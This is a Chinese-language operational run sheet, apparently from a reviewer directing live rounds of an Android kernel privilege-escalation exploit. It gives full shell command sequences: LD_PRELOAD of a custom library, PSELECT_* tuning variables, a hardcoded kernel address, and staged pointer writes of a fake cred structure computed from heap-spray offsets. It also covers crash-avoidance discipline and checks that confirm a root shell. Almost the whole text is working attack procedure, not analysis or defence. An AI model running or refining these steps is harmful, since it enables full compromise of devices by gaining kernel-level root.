# 修复轮执行指令（立即，趁 Permissive 窗口）2026-08-16 20:0x

> 响应 WIN_MT25 三问。**结论先行：立即修复轮，顺序 = 重编 → B1 → R → C。
> 你们的 Q2 问到了要害，而且你们按旧文档手填地址的话必翻车 ——
> `spray+0x3800` 是 payload 视角，真实地址差了 0xe80。mt55 已改为
> `PSELECT_PTR_RIGHT=auto` 由代码自算，别手填任何地址。**

---

## Q1：是否立即修复轮？—— 是，但先花 1 轮 B1

Permissive 对 PTR 写本身无增益（内核内存写不走 avc），窗口不会被
"浪费"。但修复轮必须用**当前二进制**（mt25 里没有 PTR_MODE），而
当前二进制在胜局配方下的触发能力**未证明**（13:15 是 mt47 且没带
SKIP_WARMUP）。B1 一轮同时买两样东西：

1. 当前二进制 + 胜局配方（含 SKIP_WARMUP=1）纯 ENF 能不能中
   （= 修复轮的触发底座证明）
2. 代码轴数据点（mt25 中 vs 当前 ?，配合我离线 diff）

miss 是安全的（无毒树手术），win 也安全（mt53 静默窗 + ENF 几何）。
**B1 之后无论中不中，都进 R**（不中也能打，miss 无害；中了说明底座稳）。

## Q2：PTR_RIGHT 怎么传？—— `auto`，绝不手填（mt55 已推）

我刚在沙箱核了 util.c:568：**假 cred 在 `payload_base+0x3800`，而
`payload_base = page_base + SKB_DATA_DELTA(-0xe80)`** —— 真实地址 =
`page_base + 0x2980`。我此前文档写的 "spray+0x3800" 是 payload 视角，
按字面手填就 off-by-delta 写进错误内存。而且 spray 页每轮重新分配，
上一轮 RUNLOG 里的 base 对下一轮**无效**——手填这条路从机制上就是死的。

mt55（已推）：`PSELECT_PTR_RIGHT=auto` → 代码内用同源宏算出精确地址。
RUNLOG 标记：`right=... [PTR_RIGHT auto=spray_fake_cred]`。
**看到 `[PTR_RIGHT override]` 或无标记 = 配置错，停**。
无喷页时（STATIC_LOCK）会硬停并打 `mt55: ... ABORT`，宁可不写。

## 执行序列（每轮前 `am kill-all`，判活看 boot_id）

### 第 0 步：重编
```
git pull && 重编 .so（mt55 就位；不设新 env 时行为与 mt54 逐字节一致）
```

### B1（1 轮，当前二进制底座证明 + 代码轴数据点）
```sh
am kill-all
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 PSELECT_RETRY=1 \
  PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 \
  PSELECT_SKIP_WARMUP=1 \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/B1.out 2>&1
echo "B1 rc=$? enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)"
```

### R（STAGE-R，B1 结束后立即）
```sh
am kill-all
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 \
  PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 \
  PSELECT_PTR_RIGHT=auto \
  PSELECT_SKIP_WARMUP=1 \
  PSELECT_WAIT_SECONDS=200 \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/rep_R.out 2>&1
echo "R rc=$? boot=$(cat /proc/sys/kernel/random/boot_id)"
grep -a "PTR_RIGHT\|futex trigger\|mid-burst" /data/local/tmp/rep_R.out
```
R 判定：子进程状态文件 CapEff 变满 / mt51 mid-burst abort 出现 = R 落地。

### C（STAGE-C，R 落地后 8 分钟子进程窗口内，task 从状态文件取）
```sh
TASK=$(grep -a "^task=" /data/local/tmp/mt49_child_status.txt | tail -1 | cut -d= -f2)
am kill-all
timeout 220 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
  PSELECT_RETRY=1 \
  PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 \
  PSELECT_PTR_RIGHT=auto \
  PSELECT_SKIP_WARMUP=1 \
  PSELECT_WAIT_SECONDS=200 \
  PSELECT_TASK=$TASK \
  LD_PRELOAD=/data/local/tmp/preload.so \
  /system/bin/sleep 180 > /data/local/tmp/rep_C.out 2>&1
echo "C rc=$? boot=$(cat /proc/sys/kernel/random/boot_id)"
```

### 终局判定（C 后）
```
ls /data/local/tmp/root_marker.txt /data/local/tmp/root_alive.txt 2>/dev/null
id（在 root_shell.txt 里）· CapEff · setenforce 状态
```
**顺序注意：先看存活（boot_id），再看 root 标记。**
R 或 C 任一轮 panic → pstore 原文第一，立即推，停手等我。

## 风险声明（照实说，不装安全）

这是 PTR 几何在 mt53/54 防护下的**首次**实弹。历史 2/2 死亡全部是
win 后自伤走树（unlock / burst 尾 / sched_setattr），三类已被 mt53
（跳 unlock + 尾弹 fast-fail）、mt54（waiter 超时拆除）、静默纪律
（win 后进程内无 futex/sched 调用）封死。剩余风险 = 防护外的未知
walk + 假 cred 字段错误（mt35 时代产物，五组 caps/SID=kernel 已核）。
**miss 无害，win 后死亡即数据**——无论哪种结果都比今晚空过窗口强。

## 存活纪律（win 后）

- 父 shell 观察，触发进程让它自然退（进程退出不走毒树）
- 60s 内不碰设备上任何东西：无 setenforce、无 am、无 kill
- C 轮结束后再动 root 验证，动作放父 shell 做

—— 评审 · mt55 + 本指令已推 · 每轮起止时间戳照记
